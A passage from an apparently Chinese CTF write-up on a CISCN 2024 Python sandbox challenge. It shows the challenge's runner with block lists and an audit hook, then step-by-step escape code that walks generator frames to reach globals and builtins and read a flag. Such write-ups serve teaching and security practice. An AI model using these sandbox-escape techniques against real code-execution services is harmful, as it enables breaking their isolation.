punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        run <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>            <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>            stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>            stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>            timeout<span class="token operator">=</span><span class="token number">3</span>        <span class="token punctuation">)</span>        result <span class="token operator">=</span> run<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        error <span class="token operator">=</span> run<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> error<span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>error<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"None"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>runner.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">source_simple_check</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Check the source with pure string in string, prevent dangerous strings    :param source: source code    :return: None    """</span>    <span class="token keyword">from</span> sys <span class="token keyword">import</span> exit    <span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token keyword">print</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        source<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> UnicodeEncodeError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"non-ascii is not permitted"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token string">"getattr"</span><span class="token punctuation">,</span> <span class="token string">"exit"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> source<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">block_wrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Check the run process with sys.audithook, no dangerous operations should be conduct    :return: None    """</span>    <span class="token keyword">def</span> <span class="token function">audit</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token keyword">print</span>        <span class="token keyword">import</span> os        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"marshal"</span><span class="token punctuation">,</span> <span class="token string">"__new__"</span><span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"sys"</span><span class="token punctuation">,</span> <span class="token string">"interpreter"</span><span class="token punctuation">,</span> <span class="token string">"cpython"</span><span class="token punctuation">,</span> <span class="token string">"open"</span><span class="token punctuation">,</span> <span class="token string">"compile"</span><span class="token punctuation">,</span> <span class="token string">"gc"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span>event <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> s <span class="token keyword">in</span> args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> audit<span class="token keyword">def</span> <span class="token function">source_opcode_checker</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Check the source in the bytecode aspect, no methods and globals should be load    :param code: source code    :return: None    """</span>    <span class="token keyword">from</span> dis <span class="token keyword">import</span> dis    <span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">str</span>    <span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO    <span class="token keyword">from</span> sys <span class="token keyword">import</span> exit    opcodeIO <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    dis<span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>opcodeIO<span class="token punctuation">)</span>    opcode <span class="token operator">=</span> opcodeIO<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    opcodeIO<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> opcode<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"LOAD_GLOBAL"</span><span class="token punctuation">,</span> <span class="token string">"IMPORT_NAME"</span><span class="token punctuation">,</span> <span class="token string">"LOAD_METHOD"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"randint"</span><span class="token punctuation">,</span> <span class="token string">"randrange"</span><span class="token punctuation">,</span> <span class="token string">"print"</span><span class="token punctuation">,</span> <span class="token string">"seed"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"LOAD_GLOBAL"</span><span class="token punctuation">,</span> <span class="token string">"IMPORT_NAME"</span><span class="token punctuation">,</span> <span class="token string">"LOAD_METHOD"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">open</span>    <span class="token keyword">from</span> sys <span class="token keyword">import</span> addaudithook    <span class="token keyword">from</span> contextlib <span class="token keyword">import</span> redirect_stdout    <span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token punctuation">,</span> randrange<span class="token punctuation">,</span> seed    <span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO    <span class="token keyword">from</span> random <span class="token keyword">import</span> seed    <span class="token keyword">from</span> time <span class="token keyword">import</span> time    source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/THIS_IS_TASK_RANDOM_ID.txt"</span></span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    source_simple_check<span class="token punctuation">(</span>source<span class="token punctuation">)</span>    source_opcode_checker<span class="token punctuation">(</span>source<span class="token punctuation">)</span>    code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">"&lt;sandbox>"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">)</span>    addaudithook<span class="token punctuation">(</span>block_wrapper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    outputIO <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> redirect_stdout<span class="token punctuation">(</span>outputIO<span class="token punctuation">)</span><span class="token punctuation">:</span>        seed<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"THIS_IS_SEED"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span>            <span class="token string">"randint"</span><span class="token punctuation">:</span> randint<span class="token punctuation">,</span>            <span class="token string">"randrange"</span><span class="token punctuation">:</span> randrange<span class="token punctuation">,</span>            <span class="token string">"seed"</span><span class="token punctuation">:</span> seed<span class="token punctuation">,</span>            <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> outputIO<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"THIS_IS_SEED"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bad code-operation why still happened ah?"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼python沙盒逃逸，估计是用栈帧打</p><p>但是过滤拉满，<code>source_simple_check</code>里面检测代码是否全是ascii值，过滤了<code>__</code>、<code>getattr</code>和 <code>exit</code></p><p><code>block_wrapper</code>不让用<code>gc</code>，<code>os</code>等</p><p><code>source_opcode_checker</code>要求opcode解释出来还不能有<code>LOAD_GLOBAL</code>、<code>IMPORT_NAME</code>、 <code>LOAD_METHOD</code></p><p>拿当前帧的信息测试一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">yield</span> <span class="token number">1</span>    <span class="token keyword">yield</span> <span class="token number">2</span>    <span class="token keyword">yield</span> <span class="token number">3</span>gen <span class="token operator">=</span> my_generator<span class="token punctuation">(</span><span class="token punctuation">)</span>frame <span class="token operator">=</span> gen<span class="token punctuation">.</span>gi_frame<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Local Variables:"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span>f_locals<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Global Variables:"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Code Object:"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span>f_code<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Instruction Pointer:"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span>f_lasti<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里写了一个把代码转换成json的脚本方便在复现时缺少前端的情况下来传入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">convert_code</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    converted_code <span class="token operator">=</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'    '</span><span class="token punctuation">,</span> <span class="token string">'\\t'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>converted_code<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"代码转换完成！"</span><span class="token punctuation">)</span><span class="token comment"># 将文件路径替换为你要转换的文件路径</span>file_path <span class="token operator">=</span> <span class="token string">'./1.py'</span>convert_code<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240520141747919.png" alt="image-20240520141747919"></p><p>然后尝试直接读</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>    frame <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    b <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span>b<span class="token operator">=</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240520141948532.png" alt="image-20240520141948532"></p><p>被测了</p><p>这里的问题其实出在了<code>next</code>上，改成生成器表达式的形式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    b <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> bb<span class="token operator">=</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240520142346620.png" alt="image-20240520142346620"></p><p>没出flag，因为我们的flag变量名被换成了<code>THIS_IS_SEED</code>，也没报错，不着急，看看前面几个栈帧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240520142503727.png" alt="image-20240520142503727"></p><p>有结果，那么先拿个<code>__globals__</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    glo <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"builtins"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>glo<span class="token punctuation">)</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240520143433229.png" alt="image-20240520143433229"></p><p>拿到globals之后就是为所欲为了，当然不能直接执行命令，会被ban的，我们得继续利用相关的模块读信息</p><blockquote><p><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>    glo <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"builtins"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>glo<span class="token punctuation">)</span>    <span class="token builtin">dir</span> <span class="token operator">=</span> glo<span class="token punctuation">.</span><span class="token builtin">dir</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>    getflag <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_code    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>getflag<span class="token punctuation">)</span><span class="token punctuation">)</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 